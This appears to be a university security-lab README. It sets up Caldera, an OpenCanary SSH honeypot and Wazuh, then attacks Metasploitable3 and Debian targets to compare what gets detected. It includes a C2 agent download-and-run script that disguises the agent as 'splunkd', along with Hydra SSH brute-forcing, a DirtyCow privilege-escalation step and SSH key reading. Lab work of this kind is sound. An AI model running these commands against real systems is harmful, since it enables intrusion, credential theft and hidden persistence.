# ICS344

---

# Installation, Configuration, and Attack Execution Steps

This document provides a detailed guide to installing the necessary tools, configuring the environments, and performing the attacks in the project.

---

## 1. Prerequisites

### Tools and Software Required:
- **Kali Linux**: The primary platform for conducting attacks.
- **Metasploitable3**: The target vulnerable machine simulating a real SSH service.
- **Debian**: The host machine for the honeypot, it can be any OS/Distro.
- **Caldera**: An adversary emulation platform designed to easily run autonomous breach-and-attack simulation exercises.
- **Opencanary**: A lightweight honeypot for simulating SSH activity.
- **Wazuh**: A SIEM tool for monitoring and analyzing attack patterns.
- **Docker**: To deploy Wazuh easily [Kali only].

Ensure the following packages are installed:
- Kali:
   - `curl`
   - `git`
   - `python3` (Version < 3.12)
   - `pip`
   - `ssh`
   - `nmap`
   - `hydra`
   - `sshpass`
   - `wget`
- Debian:
   - `curl`
   - `git`
   - `python3` (Version > 3.7)
   - `pip`
   - `ssh`
   - `hydra`
   - `sshpass`
   - `wget`
- Metasploitable3:
   - `hydra`
   - `sshpass`
   - `wget`

---

## 2. Installing the Necessary Tools

### 2.1 Install Caldera
1. Install **Node.js** and **Go**:
   > Make sure to install the correct architecture for your host machine.
   Nodejs
   ```bash
   curl -fsSL https://deb.nodesource.com/setup_20.18.1 | sudo -E bash -
   sudo apt install -y nodejs
   node -v
   ```

   Golang 
   ```bash
   wget https://go.dev/dl/go1.23.4.linux-amd64.tar.gz
   sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go1.23.4.linux-amd64.tar.gz
   export PATH=$PATH:/usr/local/go/bin
   go version
   ```

1. Clone the Caldera repository and set up the environment:
   > Only for the first run of Caldera you need to use the flag ```--build```, on next runs just run the server normally.
   ```bash
   git clone https://github.com/mitre/caldera.git --recursive
   cd caldera
   python3 -m venv venv
   source venv/bin/activate
   pip install -r requirements.txt
   python3 server.py --build
   ```
2. Save the password for ```red``` account, then usnig the browser navigate to port ```8888``` on localhost and login.

### 2.2 Deploy Sandcat Agent
1. Create a batch file for deploying the agent on Metasploitable3 and Debian:
   ```bash
   nano <file_name>.sh
   ```
2. Add the following script to the file, do not forget to change the IP address:
   ```bash
   server="http://<Kali_IP>:8888";
   curl -s -X POST -H "file:sandcat.go" -H "platform:linux" -H "gocat-extensions:" $server/file/download > splunkd;
   chmod +x splunkd;
   ./splunkd -server $server -group red -v
   ```
3. Then run the shell script:
   ```bash
   sudo ./<file_name>.sh
   ```
   > After running the script, comment the ```curl``` line so that it will not download the agent each time.

### 2.3 Install Opencanary Honeypot
1. Set up a virtual environment and install Opencanary on Debian machine:
   ```bash
   python3 -m venv opencanary
   source opencanary/bin/activate
   pip install opencanary
   ```

2. Configure Opencanary to simulate an SSH service:
   > The configration file can be found in ```/etc/opencanaryd/opencanary.conf```
   ```json
   {
       "device.node_id": "opencanary-1",
       "logging": {
           "file": {
               "enabled": true,
               "format": "%(asctime)s - %(message)s",
               "path": "opencanary.log"
           }
       },
       "ssh": {
           "enabled": true,
           "port": 22
       }
   }
   ```
3. Run the honeypot:
   ```bash
   opencanaryd --start --uid=nobody --gid=nogroup
   ```

### 2.4 Install Wazuh
1. Deploy Wazuh using Docker:
   Clonoe the repository from GitHub:
   ```bash
   git clone https://github.com/wazuh/wazuh-docker.git -b v4.9.2
   cd signle-node
   docker-compose -f generate-indexer-certs.yml run --rm generator
   ```
   Run Wazuh
   ```bash
   docker-compose up
   ```
2. Access the Wazuh dashboard at `http://127.0.0.1/app` using ```admin:SecretPassword``` and configure agents to collect logs from the SSH service and honeypot.

### 2.5 Deploy Wazuh Agent
1. Run the follownig cammand for deploying the agent on Metasploitable3 and Debian:
   > Change the architecture depending on your host machine, and add the IP address of Kali as well as the agent name. 
   ```bash
   wget https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/wazuh-agent_4.9.2-1_<ARCH>.deb && sudo WAZUH_MANAGER=<Kali_IP> WAZUH_AGENT_NAME=<Agent_name> dpkg -i ./wazuh-agent_4.9.2-1_<ARCH>.deb
   ```
   > For Metasplotable3, you can download the agent file on Kali, then transfer it to Metasploitable3 using FTP/netcat and run ```dpkg -i ./wazuh-agent_4.9.2-1_<ARCH>.deb```
2. Start the agent as background service:
   ```bash
   sudo systemctl daemon-reload
   sudo systemctl enable wazuh-agent
   sudo systemctl start wazuh-agent
   ```

---

## 3. Configuring and Performing Attacks

### 3.1 Perform Attacks Manually 
1. **Brute Force SSH Attack**:
   Execute Hydra:
   ```bash
   hydra -L /path/to/user.txt -P /path/to/pass.txt ssh://<Target_IP> -t 4 -o results.txt
   ```
2. **Privilege Escalation**:
   Use the DirtyCow exploit:
   ```bash
   ./dirtycow
   ```
3. **File and Directory Discovery**:
   ```bash
   cd $HOME && find . -print > /tmp/T1083.txt
   ```
4. **Extract SSH Keys**:
   ```bash
   cat ~/.ssh/authorized_keys
   ```

### 3.2 Configure Caldera Adversary Profile
Create a profile for the SSH attack like the following:
   3.2.1 [Adversary for Metasploitable3](./adversaries/SSH Compromiser 1.yaml):
   3.2.2 [Adversary for Debian(honeypot)](./adversaries/SSH Compromiser 2.yaml): 
then go to operation tab and create new operation for the selected adversary.

---

## 4. Monitoring and Analysis with Wazuh

1. **Forward Logs to Wazuh**:
   Configure agents to monitor logs from:
   - The real SSH service (Metasploitable3)
   - The honeypot (Opencanary)

2. **Analyze Data**:
   - Use the Wazuh dashboard to view "Alerts Evolution Over Time."
   - Evaluate detected tactics using MITRE ATT&CK mappings.

3. **Identify Anomalies**:
   - Compare patterns between the real service and honeypot.
   - Assess effectiveness of the honeypot in mimicking the real service.

---

## 5. Summary

This guide covered the installation, configuration, and execution of attacks using Caldera, Opencanary, and Wazuh. The methods provide insights into the effectiveness of automated and manual attacks while highlighting the differences between a real service and a honeypot.

## 6. References

- [Caldera Documentation](https://github.com/mitre/caldera/wiki)
- [Opencanary Documentation](https://opencanary.readthedocs.io/)
- [Wazuh Documentation](https://documentation.wazuh.com/)
- [Docker Documentation](https://docs.docker.com/)
- [Hydra Official Website](https://github.com/vanhauser-thc/thc-hydra)
- [DirtyCow Exploit Information](https://dirtycow.ninja/)
- [Kali Linux Official Documentation](https://www.kali.org/docs/)
- [Metasploitable3 Setup Guide](https://github.com/rapid7/metasploitable3)
- [MITRE ATT&CK](https://attack.mitre.org/)

